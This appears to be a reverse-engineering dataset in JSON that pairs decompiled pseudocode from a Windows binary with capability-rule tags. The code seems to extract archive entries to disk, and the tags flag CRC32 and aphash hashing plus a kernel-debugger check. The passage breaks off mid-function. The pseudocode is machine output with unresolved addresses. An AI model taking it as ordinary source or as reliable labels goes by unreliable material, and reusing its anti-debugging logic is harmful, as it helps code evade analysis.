{
    "00401c90": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00401ce1)\n\nuint8_t fcn.00401c90(void)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    uint *puVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint *var_4h;\n    \n    pcVar2 = *0x440014;\n    var_14h = 0xffffffff;\n    var_10h = 0;\n    var_ch = 0;\n    var_8h = 0;\n    (**0x440014)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    var_4h = &var_14h;\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    puVar3 = var_4h;\n    puVar1 = cpuid_Version_info(1);\n    uVar6 = puVar1[1];\n    uVar5 = puVar1[2];\n    uVar4 = puVar1[3];\n    *var_4h = *puVar1;\n    puVar3[1] = uVar6;\n    puVar3[2] = uVar4;\n    puVar3[3] = uVar5;\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    (*pcVar2)(1);\n    return var_ch >> 0x1f & 1;\n}\n",
        "token_count": 377
    },
    "00405310": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nint32_t fcn.00405310(void)\n\n{\n    uint8_t in_AL;\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint32_t *puVar3;\n    uint32_t uVar4;\n    int32_t unaff_ESI;\n    uint32_t uVar5;\n    uint32_t var_4h;\n    \n    uVar5 = -((in_AL & 2) != 0);\n    uVar4 = 0;\n    if (*(unaff_ESI + 0x46) != 0) {\n        var_4h = *(unaff_ESI + 0x46);\n        puVar3 = *(unaff_ESI + 0x138) + 0xc;\n        do {\n            if (puVar3[-1] != 0) {\n                uVar1 = *puVar3;\n                if (uVar1 < uVar5) {\n                    uVar5 = uVar1;\n                }\n                uVar1 = uVar1 + puVar3[-1];\n                if (uVar4 < uVar1) {\n                    uVar4 = uVar1;\n                }\n            }\n            puVar3 = puVar3 + 10;\n            var_4h = var_4h - 1;\n        } while (var_4h != 0);\n    }\n    iVar2 = (**0x462fe4)(*(unaff_ESI + 0x74) + uVar5, uVar4 - uVar5, 0x3000, 0x40);\n    *(unaff_ESI + 0x148) = iVar2;\n    *(unaff_ESI + 0x144) = *(unaff_ESI + 0x74);\n    if (iVar2 == 0) {\n        if ((*(unaff_ESI + 0x56) & 1) != 0) {\n            return 4;\n        }\n        iVar2 = (**0x462fe4)(0, uVar4 - uVar5, 0x3000, 0x40);\n        *(unaff_ESI + 0x148) = iVar2;\n        *(unaff_ESI + 0x144) = iVar2 - uVar5;\n    }\n    return (-(*(unaff_ESI + 0x148) != 0) & 0xfffffffd) + 3;\n}\n",
        "token_count": 515
    },
    "00405780": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_164h\n\nvoid __cdecl fcn.00405780(int32_t arg_8h, uint arg_ch, uint32_t arg_10h, uint *arg_14h)\n\n{\n    int32_t iVar1;\n    uint32_t uVar2;\n    uint var_164h;\n    uint var_160h;\n    int32_t var_f8h;\n    uint var_a8h;\n    int32_t var_28h;\n    int32_t var_1ch;\n    uint var_18h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint var_ch;\n    code *var_8h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    if (arg_8h == 0) {\n        fcn.0042a75a(arg_14h);\n        return;\n    }\n    var_28h = 0;\n    var_14h = 0;\n    var_ch = 0;\n    var_10h = 0;\n    var_8h = NULL;\n    iVar1 = fcn.00405230(arg_8h, arg_ch);\n    if (((((iVar1 == 0) && (iVar1 = fcn.00405310(),  iVar1 == 0)) &&\n         (iVar1 = fcn.004053d0(arg_8h, arg_ch, arg_10h),  iVar1 == 0)) &&\n        ((iVar1 = fcn.00405470(&var_160h),  iVar1 == 0 && (iVar1 = fcn.00405530(),  iVar1 == 0)))) &&\n       (iVar1 = fcn.004056c0(),  iVar1 == 0)) {\n        if (((arg_10h & 1) == 0) && (var_f8h != 0)) {\n            var_8h = var_f8h + var_1ch;\n            iVar1 = (*var_8h)(var_1ch, 1, 0);\n            if (iVar1 == 0) {\n                fcn.0042a75a(arg_14h);\n                return;\n            }\n        }\n        if (arg_14h == NULL) {\n            if (var_14h != 0) {\n                uVar2 = 0;\n                if (var_10h != 0) {\n                    do {\n                        (**0x4630f4)(*(var_14h + uVar2 * 4));\n                        uVar2 = uVar2 + 1;\n                    } while (uVar2 < var_10h);\n                }\n                fcn.0042a7fd(var_14h);\n            }\n        }\n        else {\n            arg_14h[2] = var_1ch;\n            arg_14h[3] = var_18h;\n            arg_14h[4] = var_8h;\n            arg_14h[5] = var_a8h;\n            *arg_14h = 0x20;\n            arg_14h[1] = arg_10h;\n            arg_14h[6] = var_14h;\n            arg_14h[7] = var_10h;\n        }\n        if (var_28h != 0) {\n            fcn.0042a7fd(var_28h);\n        }\n    }\n    fcn.0042a75a(arg_14h);\n    return;\n}\n",
        "token_count": 773
    },
    "00405a50": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405a50(uint32_t arg_8h)\n\n{\n    char **in_ECX;\n    \n    *in_ECX = \"WSHS4954XGCLRNSRX\";\n    fcn.0042aca3();\n    if ((arg_8h & 1) != 0) {\n        fcn.0042a679();\n    }\n    return;\n}\n",
        "token_count": 85
    },
    "004084f0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_294h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.004084f0(int32_t arg_8h, uint *arg_ch)\n\n{\n    char cVar1;\n    char *pcVar2;\n    unkint3 Var3;\n    uint8_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint *arg_ch_00;\n    uint8_t uVar9;\n    int32_t *in_ECX;\n    uint8_t uVar10;\n    uint *puVar11;\n    ulong uVar12;\n    uint32_t var_294h;\n    uint32_t var_284h;\n    uint var_27ch;\n    uint var_278h;\n    uint32_t var_260h;\n    uint var_244h;\n    uint32_t var_240h;\n    uint var_23ch;\n    uint var_238h;\n    int32_t *var_234h;\n    uint var_230h;\n    uint32_t var_22ch;\n    uint32_t var_228h;\n    uint32_t var_224h;\n    uint8_t var_220h;\n    uint8_t var_21fh;\n    uint8_t var_21eh;\n    uint var_21dh;\n    uint var_216h;\n    uint16_t var_212h;\n    int16_t var_210h;\n    ushort var_20eh;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    if ((arg_8h < -1) || (*(*in_ECX + 4) <= arg_8h)) {\n        fcn.0042a75a(var_294h);\n        return;\n    }\n    var_234h = in_ECX;\n    if (in_ECX[1] != -1) {\n        fcn.00408460(*in_ECX);\n    }\n    in_ECX[1] = -1;\n    if (arg_8h == in_ECX[0x4d]) {\n        if (arg_8h != -1) {\n            fcn.0042a840(arg_ch, in_ECX + 2, 300);\n            fcn.0042a75a(var_294h);\n            return;\n        }\ncode_r0x00408577:\n        *arg_ch = *(*in_ECX + 4);\n        *(arg_ch + 1) = 0;\n        arg_ch[0x42] = 0;\n        arg_ch[0x43] = 0;\n        arg_ch[0x44] = 0;\n        arg_ch[0x45] = 0;\n        arg_ch[0x46] = 0;\n        arg_ch[0x47] = 0;\n        arg_ch[0x48] = 0;\n        arg_ch[0x49] = 0;\n        arg_ch[0x4a] = 0;\n        fcn.0042a75a(var_294h);\n        return;\n    }\n    if (arg_8h == -1) goto code_r0x00408577;\n    if (arg_8h < *(*in_ECX + 0x10)) {\n        fcn.004080b0(*in_ECX);\n    }\n    iVar5 = *(*in_ECX + 0x10);\n    while (iVar5 < arg_8h) {\n        fcn.00408100(*in_ECX);\n        iVar5 = *(*in_ECX + 0x10);\n    }\n    arg_ch_00 = &var_294h;\n    fcn.00407d30(*in_ECX, arg_ch_00, 0, &var_108h, 0x104, 0, 0, 0, 0);\n    iVar5 = fcn.00408280(*in_ECX, &var_22ch, &var_224h, &var_228h);\n    if (iVar5 != 0) {\n        fcn.0042a75a(var_294h);\n        return;\n    }\n    pcVar2 = **in_ECX;\n    if (*pcVar2 == '\\0') {\n        *(pcVar2 + 0x1c) = var_224h;\n    }\n    else {\n        if (pcVar2[1] == '\\0') goto code_r0x004086bf;\n        (**0x462ee8)(*(pcVar2 + 4), *(pcVar2 + 0xc) + var_224h, 0, 0);\n    }\n    iVar5 = fcn.00429c39(var_228h);\n    uVar6 = fcn.004078e0(iVar5, 1, var_228h, **in_ECX);\n    if (uVar6 == var_228h) {\n        *arg_ch = *(*in_ECX + 0x10);\n        fcn.0042bb30(&var_20ch, &var_108h);\n        puVar11 = &var_20ch;\n        while( true ) {\n            while( true ) {\n                while( true ) {\n                    while( true ) {\n                        while( true ) {\n                            while( true ) {\n                                for (; (cVar1 = *puVar11,  cVar1 != '\\0' && (*(puVar11 + 1) == ':'));\n                                    puVar11 = puVar11 + 2) {\n                                }\n                                if (cVar1 != '\\\\') break;\n                                puVar11 = puVar11 + 1;\n                            }\n                            if (cVar1 != '/') break;\n                            puVar11 = puVar11 + 1;\n                        }\n                        iVar7 = fcn.0042b9ff(puVar11, 0x446c38);\n                        if (iVar7 == 0) break;\n                        puVar11 = iVar7 + 4;\n                    }\n                    iVar7 = fcn.0042b9ff(puVar11, 0x446c30);\n                    if (iVar7 == 0) break;\n                    puVar11 = iVar7 + 4;\n                }\n                iVar7 = fcn.0042b9ff(puVar11, 0x446c28);\n                if (iVar7 == 0) break;\n                puVar11 = iVar7 + 4;\n            }\n            iVar7 = fcn.0042b9ff(puVar11, 0x446c20);\n            if (iVar7 == 0) break;\n            puVar11 = iVar7 + 4;\n        }\n        fcn.0042b8bb(arg_ch + 1, puVar11, 0x104);\n        var_21dh._0_1_ = var_260h >> 0x1e & 1;\n        uVar10 = ~(var_260h >> 0x17);\n        uVar6 = var_294h >> 8;\n        var_21fh = 0;\n        var_220h = 0;\n        var_21eh = 1;\n        if ((((uVar6 == 0) || (uVar6 == 7)) || (uVar6 == 0xb)) || (uVar6 == 0xe)) {\n            var_21fh = var_260h >> 1 & 1;\n            var_220h = var_260h >> 2 & 1;\n            uVar10 = var_260h;\n            uVar4 = var_260h >> 5 & 1;\n            uVar9 = var_260h >> 4 & 1;\n        }\n        else {\n            uVar4 = 1;\n            uVar9 = var_21dh;\n        }\n        arg_ch[0x42] = 0;\n        if (uVar9 != 0) {\n            arg_ch[0x42] = 0x10;\n        }\n        if (uVar4 != 0) {\n            arg_ch[0x42] = arg_ch[0x42] | 0x20;\n        }\n        if (var_21fh != 0) {\n            arg_ch[0x42] = arg_ch[0x42] | 2;\n        }\n        if ((uVar10 & 1) != 0) {\n            arg_ch[0x42] = arg_ch[0x42] | 1;\n        }\n        if (var_220h != 0) {\n            arg_ch[0x42] = arg_ch[0x42] | 4;\n        }\n        arg_ch[0x49] = var_27ch;\n        arg_ch[0x4a] = var_278h;\n        var_216h._0_2_ = var_284h >> 0x10;\n        var_21dh._1_2_ = (var_216h >> 9) + 0x7bc;\n        *0x8 = var_216h >> 5 & 0xf;\n        var_216h._0_2_ = var_216h & 0x1f;\n        var_216h._2_2_ = var_284h >> 0xb;\n        var_212h = var_284h >> 5 & 0x3f;\n        var_210h = (var_284h & 0x1f) * 2;\n        puVar11 = &var_230h;\n        var_20eh = 0;\n        (**0x462fdc)(&var_21dh + 1);\n        var_244h = var_230h;\n        var_240h = var_22ch;\n        (**0x463048)(&var_244h, &var_23ch);\n        iVar7 = 0;\n        arg_ch[0x43] = var_23ch;\n        arg_ch[0x44] = var_238h;\n        arg_ch[0x45] = var_23ch;\n        arg_ch[0x46] = var_238h;\n        arg_ch[0x47] = var_23ch;\n        arg_ch[0x48] = var_238h;\n        if (4 < var_228h) {\n            do {\n                var_22ch = *(iVar5 + 2 + iVar7);\n                var_224h._0_2_ = CONCAT11(*(iVar5 + 1 + iVar7), *(iVar7 + iVar5));\n                var_224h = var_224h & 0xff000000 | var_224h;\n                iVar8 = fcn.0042baa0(&var_224h, 0x446c1c);\n                if (iVar8 == 0) {\n                    uVar10 = *(iVar7 + 4 + iVar5);\n                    var_21dh._0_1_ = uVar10 >> 1 & 1;\n                    var_21eh = uVar10 >> 2 & 1;\n                    iVar8 = iVar7 + 5;\n                    if ((uVar10 & 1) != 0) {\n                        Var3 = CONCAT21(CONCAT11(*(iVar7 + 8 + iVar5), *(iVar7 + 7 + iVar5)), *(iVar7 + 6 + iVar5));\n                        uVar6 = CONCAT31(Var3, *(iVar8 + iVar5));\n                        iVar8 = iVar7 + 9;\n                        arg_ch_00 = uVar6 + 0xb6109100;\n                        uVar12 = fcn.0042ba20(arg_ch_00, (Var3 >> 0x17) + 2 + (0x49ef6eff < uVar6), 10000000, 0);\n                        arg_ch[0x47] = uVar12;\n                        arg_ch[0x48] = uVar12 >> 0x20;\n                    }\n                    if (var_21dh != 0) {\n                        Var3 = CONCAT21(CONCAT11(*(iVar8 + 3 + iVar5), *(iVar8 + 2 + iVar5)), *(iVar8 + 1 + iVar5));\n                        uVar6 = CONCAT31(Var3, *(iVar8 + iVar5));\n                        iVar8 = iVar8 + 4;\n                        uVar12 = fcn.0042ba20(arg_ch_00, (Var3 >> 0x17) + 2 + (0x49ef6eff < uVar6), 10000000, 0, \n                                              uVar6 + 0xb6109100);\n                        arg_ch[0x43] = uVar12;\n                        arg_ch[0x44] = uVar12 >> 0x20;\n                    }\n                    if (var_21eh != 0) {\n                        Var3 = CONCAT21(CONCAT11(*(iVar8 + 3 + iVar5), *(iVar8 + 2 + iVar5)), *(iVar8 + 1 + iVar5));\n                        uVar6 = CONCAT31(Var3, *(iVar8 + iVar5));\n                        uVar12 = fcn.0042ba20(arg_ch_00, (Var3 >> 0x17) + 2 + (0x49ef6eff < uVar6), 10000000, 0, \n                                              uVar6 + 0xb6109100);\n                        arg_ch[0x45] = uVar12;\n                        arg_ch[0x46] = uVar12 >> 0x20;\n                    }\n                    break;\n                }\n                iVar7 = iVar7 + 4 + var_22ch;\n            } while (iVar7 + 4U < var_228h);\n        }\n        if (iVar5 != 0) {\n            fcn.0042bc28(iVar5);\n        }\n        fcn.0042a840(var_234h + 2, arg_ch, 300);\n        var_234h[0x4d] = arg_8h;\n        fcn.0042a75a(puVar11);\n        return;\n    }\n    fcn.0042bc28(iVar5);\ncode_r0x004086bf:\n    fcn.0042a75a(var_294h);\n    return;\n}\n",
        "token_count": 3098
    },
    "0040a290": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040a290(int32_t *arg_8h, uint8_t *arg_ch)\n\n{\n    int32_t *arg_8h_00;\n    int32_t iVar1;\n    int32_t *arg_8h_01;\n    uint8_t *puVar2;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    arg_8h_00 = arg_8h;\n    if ((arg_8h == NULL) || (arg_8h[6] == 0)) {\n        return 0xffffff9a;\n    }\n    if (arg_8h[0x1f] != 0) {\n        fcn.00408460(arg_8h);\n    }\n    iVar1 = fcn.00408280(arg_8h_00, &var_8h, &arg_8h, &var_4h);\n    if (iVar1 == 0) {\n        arg_8h_01 = fcn.0042a769(0x84);\n        if (arg_8h_01 != NULL) {\n            iVar1 = fcn.0042a769(0x4000);\n            *arg_8h_01 = iVar1;\n            arg_8h_01[0x11] = arg_8h;\n            arg_8h_01[0x12] = var_4h;\n            arg_8h_01[0x13] = 0;\n            if (iVar1 != 0) {\n                arg_8h_01[0x10] = 0;\n                iVar1 = arg_8h_00[0xd];\n                arg_8h_01[0x15] = arg_8h_00[0xf];\n                arg_8h_01[0x14] = 0;\n                arg_8h_01[0x19] = arg_8h_00[0xd];\n                arg_8h_01[0x18] = *arg_8h_00;\n                arg_8h_01[0x1a] = arg_8h_00[3];\n                arg_8h_01[6] = 0;\n                if (iVar1 != 0) {\n                    arg_8h_01[9] = 0;\n                    arg_8h_01[10] = 0;\n                    arg_8h_01[0xb] = 0;\n                    iVar1 = fcn.00407710(arg_8h_01 + 1);\n                    if (iVar1 == 0) {\n                        arg_8h_01[0x10] = 1;\n                    }\n                }\n                arg_8h_01[0x16] = arg_8h_00[0x10];\n                arg_8h_01[0x17] = arg_8h_00[0x11];\n                *(arg_8h_01 + 0x1b) = *(arg_8h_00 + 0xc) & 1;\n                if ((arg_8h_00[0xc] >> 3 & 1) == 0) {\n                    *(arg_8h_01 + 0x20) = *(arg_8h_00 + 0x3f);\n                }\n                else {\n                    *(arg_8h_01 + 0x20) = *(arg_8h_00 + 0x39);\n                }\n                arg_8h_01[0x1f] = -(*(arg_8h_01 + 0x1b) != '\\0') & 0xc;\n                arg_8h_01[0x1c] = 0x12345678;\n                arg_8h_01[0x1d] = 0x23456789;\n                arg_8h_01[0x1e] = 0x34567890;\n                for (puVar2 = arg_ch; (puVar2 != NULL && (*puVar2 != 0)); puVar2 = puVar2 + 1) {\n                    fcn.00407430(arg_8h_01 + 0x1c, *puVar2);\n                }\n                arg_8h_01[0xf] = arg_8h_00[0x1e] + 0x1e + var_8h;\n                arg_8h_01[2] = 0;\n                arg_8h_00[0x1f] = arg_8h_01;\n                return 0;\n            }\n            fcn.0042a7fd(arg_8h_01);\n        }\n        return 0xffffff98;\n    }\n    return 0xffffff99;\n}\n",
        "token_count": 1035
    },
    "0040a750": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_344h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040a750(int32_t arg_8h, char *arg_ch, uint arg_10h, int32_t arg_14h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t *in_ECX;\n    char *pcVar6;\n    uint unaff_ESI;\n    char *pcVar7;\n    uint var_344h;\n    char *var_340h;\n    uint var_339h;\n    uint32_t var_230h;\n    uint var_22ch;\n    uint var_224h;\n    uint var_21ch;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_340h = arg_ch;\n    if (arg_14h == 3) {\n        if (arg_8h != in_ECX[1]) {\n            if (in_ECX[1] != -1) {\n                fcn.00408460(*in_ECX);\n            }\n            iVar5 = *in_ECX;\n            in_ECX[1] = -1;\n            if (*(iVar5 + 4) <= arg_8h) goto code_r0x0040a78b;\n            if (arg_8h < *(iVar5 + 0x10)) {\n                fcn.004080b0(iVar5);\n            }\n            iVar5 = *(*in_ECX + 0x10);\n            while (iVar5 < arg_8h) {\n                fcn.00408100(*in_ECX);\n                iVar5 = *(*in_ECX + 0x10);\n            }\n            fcn.0040a290(*in_ECX, in_ECX[0x4e]);\n            in_ECX[1] = arg_8h;\n        }\n        iVar5 = fcn.0040a410(*in_ECX, arg_ch, arg_10h, &var_339h);\n        if (iVar5 < 1) {\n            fcn.00408460(*in_ECX);\n            in_ECX[1] = -1;\n        }\n        if (var_339h == '\\0') {\n            if (iVar5 < 1) {\n                fcn.0042a75a(var_344h);\n                return;\n            }\n            fcn.0042a75a(var_344h);\n            return;\n        }\ncode_r0x0040a83f:\n        fcn.0042a75a(unaff_ESI);\n        return;\n    }\n    if ((arg_14h != 2) && (arg_14h != 1)) {\ncode_r0x0040a78b:\n        fcn.0042a75a(var_344h);\n        return;\n    }\n    if (in_ECX[1] != -1) {\n        fcn.00408460(*in_ECX);\n    }\n    iVar5 = *in_ECX;\n    in_ECX[1] = -1;\n    if (*(iVar5 + 4) <= arg_8h) goto code_r0x0040a78b;\n    if (arg_8h < *(iVar5 + 0x10)) {\n        fcn.004080b0(iVar5);\n    }\n    iVar5 = *(*in_ECX + 0x10);\n    while (iVar5 < arg_8h) {\n        iVar5 = *in_ECX;\n        if (((iVar5 != 0) && (*(iVar5 + 0x18) != 0)) && (iVar3 = *(iVar5 + 0x10) + 1,  iVar3 != *(iVar5 + 4))) {\n            *(iVar5 + 0x14) = *(iVar5 + 0x14) + *(iVar5 + 0x50) + *(iVar5 + 0x4c) + 0x2e + *(iVar5 + 0x48);\n            *(iVar5 + 0x10) = iVar3;\n            iVar3 = fcn.00407d30(iVar5, iVar5 + 0x28, iVar5 + 0x78, 0, 0, 0, 0, 0, 0);\n            *(iVar5 + 0x18) = iVar3 == 0;\n        }\n        iVar5 = *(*in_ECX + 0x10);\n    }\n    fcn.004084f0(arg_8h, &var_339h + 1);\n    pcVar4 = var_340h;\n    if ((var_230h >> 4 & 1) != 0) goto code_r0x0040a83f;\n    var_20ch._0_1_ = 0;\n    if (arg_14h == 1) goto code_r0x0040a9e1;\n    cVar2 = *var_340h;\n    pcVar6 = var_340h;\n    pcVar7 = var_340h;\n    while (cVar2 != '\\0') {\n        if ((cVar2 == '/') || (cVar2 == '\\\\')) {\n            pcVar7 = pcVar6 + 1;\n        }\n        pcVar1 = pcVar6 + 1;\n        pcVar6 = pcVar6 + 1;\n        cVar2 = *pcVar1;\n    }\n    fcn.0042b8bb(&var_108h, var_340h, 0x104);\n    if (pcVar7 == pcVar4) {\n        var_108h._0_1_ = '\\0';\ncode_r0x0040a99a:\n        (**0x462e8c)(&var_20ch, 0x446d2c, in_ECX + 0x50, &var_108h, pcVar7);\n    }\n    else {\n        pcVar7[&var_108h - pcVar4] = '\\0';\n        if (((var_108h != '/') && (var_108h != '\\\\')) && ((var_108h == '\\0' || (var_108h._1_1_ != ':'))))\n        goto code_r0x0040a99a;\n        (**0x462e8c)(&var_20ch, 0x446d24, &var_108h, pcVar7);\n    }\n    pcVar4 = (**0x462ecc)(&var_20ch, 0x40000000, 0, 0, 2, var_230h, 0);\ncode_r0x0040a9e1:\n    if (pcVar4 == 0xffffffff) {\n        fcn.0042a75a(unaff_ESI);\n        return;\n    }\n    fcn.0040a290(*in_ECX, in_ECX[0x4e]);\n    if (in_ECX[0x4f] == 0) {\n        iVar5 = fcn.00429c39(0x4000);\n        in_ECX[0x4f] = iVar5;\n    }\n    var_340h = NULL;\n    do {\n        iVar5 = fcn.0040a410(*in_ECX, in_ECX[0x4f], 0x4000, &var_339h);\n        if (iVar5 == -0x6a) {\n            var_340h = 0x1000;\n            goto code_r0x0040aaf2;\n        }\n        if (iVar5 < 0) break;\n        if ((0 < iVar5) && (iVar3 = (**0x462f38)(pcVar4, in_ECX[0x4f], iVar5, &var_344h, 0),  iVar3 == 0)) {\n            var_340h = 0x400;\n            goto code_r0x0040aaf2;\n        }\n        if (var_339h != '\\0') goto code_r0x0040aaf2;\n    } while (iVar5 != 0);\n    var_340h = 0x5000000;\ncode_r0x0040aaf2:\n    fcn.00408460(*in_ECX);\n    if (var_340h == NULL) {\n        (**0x463074)(pcVar4, &var_224h, &var_22ch, &var_21ch);\n    }\n    if (arg_14h != 1) {\n        (**0x462ed0)(pcVar4);\n    }\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1919
    },
    "0040acb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_344h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0040acb0(int32_t *arg_8h, int32_t arg_ch, char *arg_10h)\n\n{\n    char *pcVar1;\n    char cVar2;\n    int32_t *piVar3;\n    char *pcVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    char *pcVar8;\n    uint unaff_ESI;\n    char *pcVar9;\n    uint var_344h;\n    char var_33dh;\n    char *var_33ch;\n    uint var_338h;\n    uint32_t var_230h;\n    uint var_22ch;\n    uint var_224h;\n    uint var_21ch;\n    uint var_20ch;\n    uint var_108h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4506f0 ^ &stack0xfffffffc;\n    var_33ch = arg_10h;\n    if (arg_8h == NULL) {\n        *0x452464 = 0x10000;\n        fcn.0042a75a(var_344h);\n        return;\n    }\n    if (*arg_8h != 1) {\n        *0x452464 = 0x80000;\n        fcn.0042a75a(var_344h);\n        return;\n    }\n    piVar3 = arg_8h[1];\n    if (piVar3[1] != -1) {\n        fcn.00408460(*piVar3);\n    }\n    iVar6 = *piVar3;\n    piVar3[1] = -1;\n    if (*(iVar6 + 4) <= arg_ch) {\n        pcVar4 = 0x10000;\n        goto code_r0x0040af8c;\n    }\n    if (arg_ch < *(iVar6 + 0x10)) {\n        fcn.004080b0(iVar6);\n    }\n    iVar6 = *(*piVar3 + 0x10);\n    while (iVar6 < arg_ch) {\n        iVar6 = *piVar3;\n        if (((iVar6 != 0) && (*(iVar6 + 0x18) != 0)) && (iVar5 = *(iVar6 + 0x10) + 1,  iVar5 != *(iVar6 + 4))) {\n            *(iVar6 + 0x14) = *(iVar6 + 0x14) + *(iVar6 + 0x50) + *(iVar6 + 0x4c) + 0x2e + *(iVar6 + 0x48);\n            *(iVar6 + 0x10) = iVar5;\n            iVar5 = fcn.00407d30(iVar6, iVar6 + 0x28, iVar6 + 0x78, 0, 0, 0, 0, 0, 0);\n            *(iVar6 + 0x18) = iVar5 == 0;\n        }\n        iVar6 = *(*piVar3 + 0x10);\n    }\n    fcn.004084f0(arg_ch, &var_338h);\n    pcVar4 = var_33ch;\n    if ((var_230h >> 4 & 1) != 0) {\n        pcVar4 = NULL;\n        goto code_r0x0040af8c;\n    }\n    cVar2 = *var_33ch;\n    var_20ch._0_1_ = 0;\n    pcVar8 = var_33ch;\n    pcVar9 = var_33ch;\n    while (cVar2 != '\\0') {\n        if ((cVar2 == '/') || (cVar2 == '\\\\')) {\n            pcVar9 = pcVar8 + 1;\n        }\n        pcVar1 = pcVar8 + 1;\n        pcVar8 = pcVar8 + 1;\n        cVar2 = *pcVar1;\n    }\n    fcn.0042b8bb(&var_108h, var_33ch, 0x104);\n    if (pcVar9 == pcVar4) {\n        var_108h._0_1_ = '\\0';\ncode_r0x0040ae13:\n        (**0x462e8c)(&var_20ch, 0x446d2c, piVar3 + 0x50, &var_108h, pcVar9);\n    }\n    else {\n        pcVar9[&var_108h - pcVar4] = '\\0';\n        if (((var_108h != '/') && (var_108h != '\\\\')) && ((var_108h == '\\0' || (var_108h._1_1_ != ':'))))\n        goto code_r0x0040ae13;\n        (**0x462e8c)(&var_20ch, 0x446d24, &var_108h, pcVar9);\n    }\n    iVar6 = (**0x462ecc)(&var_20ch, 0x40000000, 0, 0, 2, var_230h, 0);\n    if (iVar6 == -1) {\n        pcVar4 = 0x200;\n    }\n    else {\n        fcn.0040a290(*piVar3, piVar3[0x4e]);\n        if (piVar3[0x4f] == 0) {\n            iVar5 = fcn.00429c39(0x4000);\n            piVar3[0x4f] = iVar5;\n        }\n        var_33ch = NULL;\n        do {\n            iVar5 = fcn.0040a410(*piVar3, piVar3[0x4f], 0x4000, &var_33dh);\n            if (iVar5 == -0x6a) {\n                var_33ch = 0x1000;\n                goto code_r0x0040af52;\n            }\n            if (iVar5 < 0) break;\n            if ((0 < iVar5) && (iVar7 = (**0x462f38)(iVar6, piVar3[0x4f], iVar5, &var_344h, 0),  iVar7 == 0)) {\n                var_33ch = 0x400;\n                goto code_r0x0040af52;\n            }\n            if (var_33dh != '\\0') goto code_r0x0040af52;\n        } while (iVar5 != 0);\n        var_33ch = 0x5000000;\ncode_r0x0040af52:\n        fcn.00408460(*piVar3);\n        pcVar4 = var_33ch;\n        if (var_33ch == NULL) {\n            (**0x463074)(iVar6, &var_224h, &var_22ch, &var_21ch);\n        }\n        (**0x462ed0)(iVar6);\n    }\ncode_r0x0040af8c:\n    *0x452464 = pcVar4;\n    fcn.0042a75a(unaff_ESI);\n    return;\n}\n",
        "token_count": 1584
    },
    "0040efb0": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0040efb0(uchar *arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, uint arg_1ch, uint32_t arg_20h, \n            uint noname_7, int32_t arg_28h, uint *arg_2ch, uint noname_10, uint noname_11, uint noname_12, \n            uint noname_13, uint32_t arg_40h)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    uint *puVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    int32_t iVar9;\n    uint32_t uVar10;\n    int32_t *in_FS_OFFSET;\n    uint var_a2ch;\n    uchar *var_a28h;\n    uint var_a20h;\n    int32_t var_a1ch;\n    uint32_t var_a18h;\n    uint var_a14h;\n    uint32_t var_a00h;\n    uint32_t var_9f8h;\n    uint var_9e8h;\n    uint32_t var_9e4h;\n    uint32_t var_9dch;\n    uint var_9cch;\n    